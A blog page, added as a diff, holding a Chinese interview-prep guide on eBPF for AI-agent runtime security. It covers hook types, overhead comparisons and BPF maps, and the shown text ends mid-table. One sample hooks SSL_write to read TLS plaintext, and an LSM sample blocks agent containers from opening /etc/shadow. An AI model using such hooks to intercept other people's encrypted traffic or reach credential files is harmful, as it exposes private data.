@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html lang="EN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Swing&#39;Blog 浮生若梦</title>
+
+
+<meta name="description" content="Know it then hack it!">
+
+
+<meta name="author" content="Swing">
+
+
+
+<!-- Canonical -->
+<link rel="canonical" href="/about/interview-prep-agent-security.html">
+
+<!-- Favicon -->
+<link rel="icon" href="/images/favicon.ico">
+
+<!-- RSS -->
+
+<link rel="alternate" type="application/rss+xml" title="Swing&#39;Blog 浮生若梦" href="/atom.xml">
+
+
+<!-- Open Graph -->
+<meta property="og:type" content="website">
+<meta property="og:title" content="Swing&#39;Blog 浮生若梦">
+<meta property="og:url" content="/about/interview-prep-agent-security.html">
+<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
+
+<meta property="og:description" content="Know it then hack it!">
+
+
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Swing&#39;Blog 浮生若梦">
+
+<meta name="twitter:description" content="Know it then hack it!">
+
+
+<!-- Theme Color -->
+<meta name="theme-color" content="#1d1f21">
+<meta name="msapplication-TileColor" content="#1d1f21">
+
+<!-- Stylesheets -->
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<!-- Custom Layout Variables -->
+
+<style>
+:root {
+  --page-width: 60rem;
+  --content-width: 1200px;
+  --mobile-padding: 12px;
+}
+</style>
+
+<!-- Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-133464311-1');
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body class="theme-dark">
+  <div class="container">
+    <header class="header">
+  <div class="header-inner">
+    <div class="header-brand">
+      
+        <a href="/" class="logo">
+          <img src="/images/logo.png"
+               width="50"
+               height="50"
+               alt="Swing&#39;Blog 浮生若梦">
+        </a>
+      
+      <a href="/" class="site-title">
+        Swing&#39;Blog 浮生若梦
+      </a>
+    </div>
+
+    <nav class="nav">
+      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+        <span class="nav-toggle-bar"></span>
+      </button>
+
+      <ul class="nav-menu" id="nav-menu">
+        
+          
+          
+            
+            <li class="nav-item">
+              <a href="/"
+                 class="nav-link"
+                 >
+                Home
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/about/"
+                 class="nav-link active"
+                 >
+                About
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/archives/"
+                 class="nav-link"
+                 >
+                Articles
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/atom.xml"
+                 class="nav-link"
+                 >
+                RSS
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/categories/"
+                 class="nav-link"
+                 >
+                Categories
+              </a>
+            </li>
+            
+              <li class="nav-divider">|</li>
+            
+          
+            
+            <li class="nav-item">
+              <a href="/link"
+                 class="nav-link"
+                 >
+                Links
+              </a>
+            </li>
+            
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main class="main">
+      
+        <div class="page-layout">
+          <article class="page">
+  <header class="page-header">
+    <h1 class="page-title"></h1>
+  </header>
+
+  <div class="page-content">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="AI-Agent-系统安全研究工程师（eBPF-Runtime-Security）面试准备"><a href="#AI-Agent-系统安全研究工程师（eBPF-Runtime-Security）面试准备" class="headerlink" title="AI Agent 系统安全研究工程师（eBPF / Runtime Security）面试准备"></a>AI Agent 系统安全研究工程师（eBPF / Runtime Security）面试准备</h1><hr>
+<h2 id="一、面试背景与自我定位"><a href="#一、面试背景与自我定位" class="headerlink" title="一、面试背景与自我定位"></a>一、面试背景与自我定位</h2><h3 id="1-1-面试情况"><a href="#1-1-面试情况" class="headerlink" title="1.1 面试情况"></a>1.1 面试情况</h3><ul>
+<li><strong>岗位：</strong> AI Agent 系统安全研究工程师（eBPF / Runtime Security 方向）</li>
+<li><strong>面试类型：</strong> 交叉面试</li>
+<li><strong>面试官背景：</strong> eBPF 方向，做 GPU 训练集群的性能监控/可观测性（NCCL、RDMA、CUDA 调用链路等）。他是 eBPF 的深度用户，但视角是性能/可靠性而非安全</li>
+</ul>
+<p><strong>交叉面考察维度：</strong></p>
+<ol>
+<li><strong>eBPF 内功</strong>——他天天写 eBPF，会从实践角度问细节，不是背概念能过的</li>
+<li><strong>性能敏感度</strong>——训练集群每 1% 的开销都是真金白银（GPU 小时很贵），你的安全监控能不能控制开销</li>
+<li><strong>协作意识</strong>——安全监控和性能监控能不能共用基础设施、避免冲突</li>
+<li><strong>跨领域理解</strong>——你对他的领域（训练监控）了解多少，能不能对话</li>
+</ol>
+<h3 id="1-2-自我介绍（建议-2-分钟）"><a href="#1-2-自我介绍（建议-2-分钟）" class="headerlink" title="1.2 自我介绍（建议 2 分钟）"></a>1.2 自我介绍（建议 2 分钟）</h3><blockquote>
+<p>我叫施伟铭，7 年安全研究经验。职业路径是从 IoT 漏洞挖掘开始，在长亭科技做了将近 7 年，累计发现 50+ CVE，覆盖 Cisco、ASUS、华为、QNAP 等厂商以及 Linux Kernel、FreeBSD 系统层面。</p>
+<p>2025 年 11 月加入 STAR Labs SG，目前专注 Linux eBPF 子系统的安全审计，已有多个 Linux Kernel CVE 产出。</p>
+<p>我的核心技能和这个岗位高度相关：一是 eBPF 安全审计的实战经验，让我从攻击者角度理解 eBPF 的能力和局限；二是容器逃逸的深入研究——公开分析过 CVE-2019-5736、CVE-2024-21626 等经典逃逸漏洞，2021 年天府杯做过 Docker 逃逸 + Linux 提权利用链；三是一直在关注 AI 安全前沿，理解 Prompt Injection、Tool Use、代码执行沙箱这些新兴攻击面。</p>
+<p>我认为 Agent Runtime Security 需要同时理解内核/系统层的攻击面和 AI 应用层的威胁模型，我的背景正好能连接这两端。</p>
+</blockquote>
+<h3 id="1-3-核心差异化"><a href="#1-3-核心差异化" class="headerlink" title="1.3 核心差异化"></a>1.3 核心差异化</h3><p>同时具备”内核/eBPF 攻击视角”和”容器逃逸实战经验”，这在 AI Agent Runtime Security 领域非常稀缺——大多数候选人要么只懂 LLM 应用层，要么只懂传统内核安全，你可以打通两端。</p>
+<hr>
+<h2 id="二、eBPF-基础知识速查"><a href="#二、eBPF-基础知识速查" class="headerlink" title="二、eBPF 基础知识速查"></a>二、eBPF 基础知识速查</h2><blockquote>
+<p>面试前务必过一遍，确保这些概念不仅”听过”，而且能用自己的话讲清楚。</p>
+</blockquote>
+<h3 id="2-1-eBPF-是什么"><a href="#2-1-eBPF-是什么" class="headerlink" title="2.1 eBPF 是什么"></a>2.1 eBPF 是什么</h3><p>eBPF（extended Berkeley Packet Filter）允许你在<strong>不修改内核源码、不加载内核模块</strong>的情况下，在内核中运行自定义的沙箱程序。你写一段 C 程序 → 编译成 eBPF 字节码 → 通过 <code>bpf()</code> 系统调用加载到内核 → 内核的 verifier 做安全检查 → JIT 编译成机器码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用户态                                内核态</span><br><span class="line">┌──────────────┐                ┌──────────────────────┐</span><br><span class="line">│ BPF 程序 (.c) │──clang&#x2F;llvm──→│ 字节码 (.o)           │</span><br><span class="line">│              │               │     │                  │</span><br><span class="line">│ 用户态 loader │──bpf() ──────→│  Verifier (安全检查)   │</span><br><span class="line">│ (libbpf等)   │               │     │                  │</span><br><span class="line">│              │               │  JIT Compiler          │</span><br><span class="line">│              │               │     │                  │</span><br><span class="line">│              │               │  attach 到 hook 点     │</span><br><span class="line">│              │               │  (kprobe&#x2F;tracepoint&#x2F;   │</span><br><span class="line">│              │               │   LSM&#x2F;XDP&#x2F;...)         │</span><br><span class="line">│              │               │     │                  │</span><br><span class="line">│  ring buffer ◄───事件数据─────│  BPF 程序执行          │</span><br><span class="line">│  &#x2F; map 读取  ◄───────────────│  BPF map (共享数据)    │</span><br><span class="line">└──────────────┘                └──────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心优势：</strong> 安全（verifier 保证不会 crash 内核）、高性能（JIT 编译、内核态执行无上下文切换）、动态（热加载热卸载）。</p>
+<p><strong>程序类型矩阵：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">├── 观测类：kprobe&#x2F;kretprobe, fentry&#x2F;fexit, tracepoint, raw_tracepoint, perf_event</span><br><span class="line">├── 网络类：XDP, TC, socket filter, sk_msg, cgroup&#x2F;skb</span><br><span class="line">├── 安全类：LSM (BPF_PROG_TYPE_LSM)</span><br><span class="line">└── 调度类：struct_ops (sched_ext)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Hook-机制详解"><a href="#2-2-Hook-机制详解" class="headerlink" title="2.2 Hook 机制详解"></a>2.2 Hook 机制详解</h3><p>eBPF 程序需要 attach（挂载）到内核的某个 <strong>hook 点</strong> 上，当该 hook 点被触发时，eBPF 程序就会执行。</p>
+<h4 id="kprobe-kretprobe（内核函数探针）"><a href="#kprobe-kretprobe（内核函数探针）" class="headerlink" title="kprobe / kretprobe（内核函数探针）"></a>kprobe / kretprobe（内核函数探针）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1. 你指定要 hook 的内核函数名，比如 do_sys_openat2</span><br><span class="line">2. 内核把该函数入口的第一条指令替换为 int3 (断点指令)</span><br><span class="line">3. CPU 执行到这里 → 触发 trap → 内核调用你的 BPF 程序 → 恢复原指令继续执行</span><br><span class="line">4. kretprobe 同理，但 hook 的是函数返回点</span><br><span class="line"></span><br><span class="line">特点：</span><br><span class="line">- 可以 hook 内核中几乎任意函数（只要你知道函数名）</span><br><span class="line">- 灵活性最高，但依赖内核符号（非稳定 ABI，不同版本函数名&#x2F;参数可能变）</span><br><span class="line">- 开销：每次调用约 50-100ns（因为要进出 trap handler）</span><br><span class="line">- 参数获取：从 pt_regs 结构体中按 CPU 寄存器约定取（容易出错）</span><br><span class="line"></span><br><span class="line">示例（libbpf C 风格）：</span><br><span class="line">  SEC(&quot;kprobe&#x2F;do_sys_openat2&quot;)</span><br><span class="line">  int trace_open(struct pt_regs *ctx) &#123;</span><br><span class="line">      &#x2F;&#x2F; ctx-&gt;di &#x3D; 第1个参数 (x86_64 调用约定)</span><br><span class="line">      &#x2F;&#x2F; ctx-&gt;si &#x3D; 第2个参数</span><br><span class="line">      char filename[256];</span><br><span class="line">      bpf_probe_read_user_str(filename, sizeof(filename), (void *)PT_REGS_PARM2(ctx));</span><br><span class="line">      bpf_printk(&quot;open file: %s\n&quot;, filename);</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="fentry-fexit（BPF-Trampoline，5-5-内核）"><a href="#fentry-fexit（BPF-Trampoline，5-5-内核）" class="headerlink" title="fentry / fexit（BPF Trampoline，5.5+ 内核）"></a>fentry / fexit（BPF Trampoline，5.5+ 内核）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1. 不用 int3 断点，而是在函数入口前插入一个 jmp 指令跳到 BPF trampoline</span><br><span class="line">2. Trampoline 直接调用 BPF 程序，不经过 trap handler</span><br><span class="line">3. fexit 可以同时拿到入参和返回值</span><br><span class="line"></span><br><span class="line">特点：</span><br><span class="line">- 比 kprobe 快一个数量级：约 5-10ns（无 trap 开销）</span><br><span class="line">- 参数访问是类型安全的（通过 BTF），直接用结构体字段名</span><br><span class="line">- 需要内核有 BTF 支持（5.5+）</span><br><span class="line">- 是 kprobe 的升级替代，新内核上优先使用</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">  SEC(&quot;fentry&#x2F;do_sys_openat2&quot;)</span><br><span class="line">  int BPF_PROG(trace_open, int dfd, struct filename *name, struct open_how *how) &#123;</span><br><span class="line">      &#x2F;&#x2F; 参数直接有名字和类型，不用从寄存器里抠</span><br><span class="line">      bpf_printk(&quot;open dfd: %d\n&quot;, dfd);</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="tracepoint（内核静态追踪点）"><a href="#tracepoint（内核静态追踪点）" class="headerlink" title="tracepoint（内核静态追踪点）"></a>tracepoint（内核静态追踪点）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1. 内核源码中预埋了 trace_xxx() 宏调用（约 2000+ 个追踪点）</span><br><span class="line">2. 未启用时几乎零开销（static key &#x2F; nop）</span><br><span class="line">3. 启用后，每次执行到该点就调用注册的 BPF 程序</span><br><span class="line"></span><br><span class="line">特点：</span><br><span class="line">- 稳定 ABI：内核保证 tracepoint 的格式跨版本兼容</span><br><span class="line">- 性能好，适合生产环境长期开启</span><br><span class="line">- 但只能 hook 内核预定义的点，不如 kprobe 灵活</span><br><span class="line">- 参数通过 tracepoint 专有的 ctx 结构体传递（有明确的字段定义）</span><br><span class="line"></span><br><span class="line">常用的 tracepoint 举例：</span><br><span class="line">  sched:sched_process_exec     → 进程 execve 时触发</span><br><span class="line">  sched:sched_process_fork     → 进程 fork 时触发</span><br><span class="line">  sched:sched_process_exit     → 进程退出时触发</span><br><span class="line">  syscalls:sys_enter_openat    → openat 系统调用入口</span><br><span class="line">  syscalls:sys_enter_connect   → connect 系统调用入口</span><br><span class="line">  net:net_dev_xmit             → 网络包发送时触发</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">  SEC(&quot;tracepoint&#x2F;sched&#x2F;sched_process_exec&quot;)</span><br><span class="line">  int trace_exec(struct trace_event_raw_sched_process_exec *ctx) &#123;</span><br><span class="line">      pid_t pid &#x3D; bpf_get_current_pid_tgid() &gt;&gt; 32;</span><br><span class="line">      bpf_printk(&quot;exec pid: %d\n&quot;, pid);</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="raw-tracepoint"><a href="#raw-tracepoint" class="headerlink" title="raw_tracepoint"></a>raw_tracepoint</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 和 tracepoint 类似，但跳过了 tracepoint 的参数格式化步骤</span><br><span class="line">- 直接拿到原始参数（void * 指针），需要自己 cast</span><br><span class="line">- 比 tracepoint 开销更低（少了格式化步骤）</span><br><span class="line">- 适合对性能极度敏感且知道自己在做什么的场景</span><br></pre></td></tr></table></figure>
+
+<h4 id="uprobe-uretprobe（用户态函数探针）"><a href="#uprobe-uretprobe（用户态函数探针）" class="headerlink" title="uprobe / uretprobe（用户态函数探针）"></a>uprobe / uretprobe（用户态函数探针）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1. 类似 kprobe，但 hook 的是用户态 ELF 二进制中的函数</span><br><span class="line">2. 内核在目标函数地址设置断点</span><br><span class="line">3. 用户态进程执行到该函数 → trap 到内核 → 执行 BPF 程序 → 返回用户态</span><br><span class="line"></span><br><span class="line">特点：</span><br><span class="line">- 可以 hook 任何用户态的 native 函数（C&#x2F;C++&#x2F;Go&#x2F;Rust 编译的二进制）</span><br><span class="line">- 需要指定二进制路径 + 函数名或偏移</span><br><span class="line">- 开销比 kprobe 高（用户态 → 内核态来回切换）</span><br><span class="line">- 对解释型语言（Python&#x2F;Java）不能直接 hook 业务函数，</span><br><span class="line">  只能 hook 解释器本身的 native 函数</span><br><span class="line"></span><br><span class="line">示例（hook libssl 的 SSL_write 抓明文）：</span><br><span class="line">  SEC(&quot;uprobe&#x2F;&#x2F;usr&#x2F;lib&#x2F;libssl.so.3:SSL_write&quot;)</span><br><span class="line">  int trace_ssl_write(struct pt_regs *ctx) &#123;</span><br><span class="line">      void *buf &#x3D; (void *)PT_REGS_PARM2(ctx);</span><br><span class="line">      char data[128];</span><br><span class="line">      bpf_probe_read_user(data, sizeof(data), buf);</span><br><span class="line">      bpf_printk(&quot;SSL_write: %s\n&quot;, data);</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">Python 层面的特殊处理：</span><br><span class="line">- Python 函数不是 native 函数，不能直接 uprobe</span><br><span class="line">- 方案一：hook CPython 解释器的 C 函数</span><br><span class="line">  如 _PyEval_EvalFrameDefault，从 PyFrameObject 中提取函数名</span><br><span class="line">- 方案二：利用 CPython 内置的 USDT probe（需 --with-dtrace 编译）</span><br><span class="line">  有 function__entry &#x2F; function__return 探针</span><br><span class="line">- 方案三：Python 3.12+ 支持 perf_trampoline，</span><br><span class="line">  让 perf &#x2F; eBPF 能直接看到 Python 函数的符号名</span><br></pre></td></tr></table></figure>
+
+<h4 id="USDT（User-Statically-Defined-Tracepoints）"><a href="#USDT（User-Statically-Defined-Tracepoints）" class="headerlink" title="USDT（User Statically Defined Tracepoints）"></a>USDT（User Statically Defined Tracepoints）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- 用户态程序源码中预埋的静态追踪点（类似内核的 tracepoint）</span><br><span class="line">- 未启用时是 nop 指令，零开销；启用时内核把 nop 替换为 trap 指令</span><br><span class="line">- 比 uprobe 开销更低（未启用时完全零开销）</span><br><span class="line">- 需要程序编译时显式添加 DTRACE_PROBE() 宏</span><br><span class="line">- MySQL、PostgreSQL、Node.js、CPython、JVM 等都内置了 USDT probe</span><br><span class="line"></span><br><span class="line">示例（追踪 CPython 函数调用）：</span><br><span class="line">  SEC(&quot;usdt&#x2F;&#x2F;usr&#x2F;bin&#x2F;python3:function__entry&quot;)</span><br><span class="line">  int trace_py_func(struct pt_regs *ctx) &#123;</span><br><span class="line">      &#x2F;&#x2F; arg0 &#x3D; filename, arg1 &#x3D; funcname, arg2 &#x3D; lineno</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="LSM-hook（BPF-PROG-TYPE-LSM）"><a href="#LSM-hook（BPF-PROG-TYPE-LSM）" class="headerlink" title="LSM hook（BPF_PROG_TYPE_LSM）"></a>LSM hook（BPF_PROG_TYPE_LSM）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">1. Linux Security Module 框架在内核关键操作前预埋了约 200+ 个安全检查点</span><br><span class="line">2. BPF LSM 允许把 eBPF 程序 attach 到这些检查点</span><br><span class="line">3. BPF 程序返回 0 &#x3D; 允许操作，返回负值（如 -EPERM）&#x3D; 拒绝操作</span><br><span class="line"></span><br><span class="line">特点：</span><br><span class="line">- 唯一能做访问控制决策的 eBPF 程序类型（其他类型只能观测）</span><br><span class="line">- 动态加载&#x2F;卸载，无需重启（相比 AppArmor&#x2F;SELinux）</span><br><span class="line">- 可以访问 BPF map 做有状态决策</span><br><span class="line">- 需要 5.7+ 内核 + CONFIG_BPF_LSM 编译选项</span><br><span class="line"></span><br><span class="line">常用 LSM hook 点：</span><br><span class="line">  security_file_open          → 文件打开前</span><br><span class="line">  security_inode_create       → 创建文件&#x2F;目录前</span><br><span class="line">  security_inode_unlink       → 删除文件前</span><br><span class="line">  security_socket_connect     → socket 连接前</span><br><span class="line">  security_socket_sendmsg     → socket 发送数据前</span><br><span class="line">  security_bprm_check         → 执行程序前 (execve)</span><br><span class="line">  security_capable            → 权限检查</span><br><span class="line">  security_task_setnice       → 修改进程优先级前</span><br><span class="line"></span><br><span class="line">示例（阻止容器访问 &#x2F;etc&#x2F;shadow）：</span><br><span class="line">  SEC(&quot;lsm&#x2F;file_open&quot;)</span><br><span class="line">  int BPF_PROG(restrict_file_open, struct file *file) &#123;</span><br><span class="line">      struct path path &#x3D; file-&gt;f_path;</span><br><span class="line">      u64 cgroup_id &#x3D; bpf_get_current_cgroup_id();</span><br><span class="line">      if (!is_agent_container(cgroup_id))</span><br><span class="line">          return 0;  &#x2F;&#x2F; 非 Agent 容器，放行</span><br><span class="line">      if (match_blacklist(&amp;path))</span><br><span class="line">          return -EPERM;  &#x2F;&#x2F; 拒绝</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="XDP-TC（网络数据面）"><a href="#XDP-TC（网络数据面）" class="headerlink" title="XDP / TC（网络数据面）"></a>XDP / TC（网络数据面）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XDP (eXpress Data Path)：</span><br><span class="line">- 在网卡驱动层（最早的入口点）处理网络包</span><br><span class="line">- 可以做 DROP &#x2F; PASS &#x2F; REDIRECT &#x2F; TX（回发）</span><br><span class="line">- 性能极高（几百万 pps），适合 DDoS 防护</span><br><span class="line">- 一个网卡只能 attach 一个 XDP 程序（除非用 libxdp dispatcher）</span><br><span class="line"></span><br><span class="line">TC (Traffic Control)：</span><br><span class="line">- 在内核网络栈的 TC 层处理包（比 XDP 晚，但能看到更多上下文）</span><br><span class="line">- 可以做 ingress 和 egress 两个方向</span><br><span class="line">- Cilium 大量使用 TC eBPF 做容器网络策略</span><br><span class="line"></span><br><span class="line">cgroup&#x2F;skb, cgroup&#x2F;sock：</span><br><span class="line">- 按 cgroup（&#x3D; 容器&#x2F;Pod）粒度做网络策略</span><br><span class="line">- 比如：限制某个容器只能连接特定 IP:port</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-各-Hook-机制对比总结"><a href="#2-3-各-Hook-机制对比总结" class="headerlink" title="2.3 各 Hook 机制对比总结"></a>2.3 各 Hook 机制对比总结</h3><table>
+<thead>
+<tr>
+<th></th>
+<th>kprobe</th>
+<th>fentry</th>
+<th>tracepoint</th>
+<th>uprobe</th>
+<th>USDT</th>
+<th>LSM</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>hook 目标</strong></td>
+<td>内核任意函数</td>
+<td>内核任意函数</td>
+<td>内核预定义点</td>
+<td>用户态函数</td>
+<td>用户态预定义点</td>
+<td>安全检查点</td>
+</tr>
+<tr>
+<td><strong>稳定性</strong></td>
+<td>不稳定（依赖符号）</td>
+<td>不稳定</td>
+<td>稳定 ABI</td>
+<td>依赖二进制</td>
+<td>稳定</td>
+<td>稳定</td>
+</tr>
+<tr>
+<td><strong>性能开销</strong></td>
+<td>~50-100ns</td>
+<td>~5-10ns</td>
+<td>低</td>
+<td>较高</td>
+<td>极低(未启用=0)</td>
+<td>低</td>
+</tr>
+<tr>
+<td><strong>能否阻断</strong></td>
+<td>否（只观测）</td>
+<td>否</td>
+<td>否</td>
+<td>否</td>
+<td>否</td>
+<td><strong>是</strong>（可拒绝）</td>
+</tr>
+<tr>
+<td><strong>参数类型安全</strong></td>
+<td>否（pt_regs）</td>
+<td>是（BTF）</td>
+<td>是</td>
+<td>否（pt_regs）</td>
+<td>否</td>
+<td>是（BTF）</td>
+</tr>
+<tr>
+<td><strong>最低内核版本</strong></td>
+<td>4.1</td>
+<td>5.5</td>
+<td>4.7</td>
+<td>4.1</td>
+<td>4.20</td>
+<td>5.7</td>
+</tr>
+<tr>
+<td><strong>典型场景</strong></td>
+<td>调试、深度分析</td>
+<td>替代 kprobe</td>
+<td>生产监控</td>
+<td>用户态追踪</td>
+<td>应用级追踪</td>
+<td>安全策略执行</td>
+</tr>
+</tbody></table>
+<h3 id="2-4-BPF-Map"><a href="#2-4-BPF-Map" class="headerlink" title="2.4 BPF Map"></a>2.4 BPF Map</h3><p>Map 是 eBPF 程序和用户态之间、以及多个 eBPF 程序之间共享数据的机制。可以理解为内核中的键值数据库。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户态进程                    内核中的 BPF 程序</span><br><span class="line">    │                              │</span><br><span class="line">    │  bpf_map_update_elem()       │  bpf_map_lookup_elem()</span><br><span class="line">    │  bpf_map_lookup_elem()       │  bpf_map_update_elem()</span><br><span class="line">    │  bpf_map_delete_elem()       │  bpf_map_delete_elem()</span><br><span class="line">    │                              │</span><br><span class="line">    └──────────── BPF Map ─────────┘</span><br><span class="line">                (内核内存中)</span><br><span class="line"></span><br><span class="line">生命周期：</span><br><span class="line">- 创建：BPF 程序加载时由 libbpf 自动创建，或 bpf_map_create() 手动创建</span><br><span class="line">- pin 到 bpffs：可以把 map pin 到 &#x2F;sys&#x2F;fs&#x2F;bpf&#x2F;xxx，多个进程&#x2F;程序可以共享</span><br><span class="line">- 销毁：所有引用（fd）关闭且未 pin 时自动销毁</span><br></pre></td></tr></table></figure>
+
+<p><strong>常用 Map 类型：</strong></p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>数据结构</th>
+<th>关键特点</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HASH</td>
+<td>哈希表</td>
+<td>O(1) 查找/插入/删除</td>
+<td>策略表、PID 白名单、连接追踪</td>
+</tr>
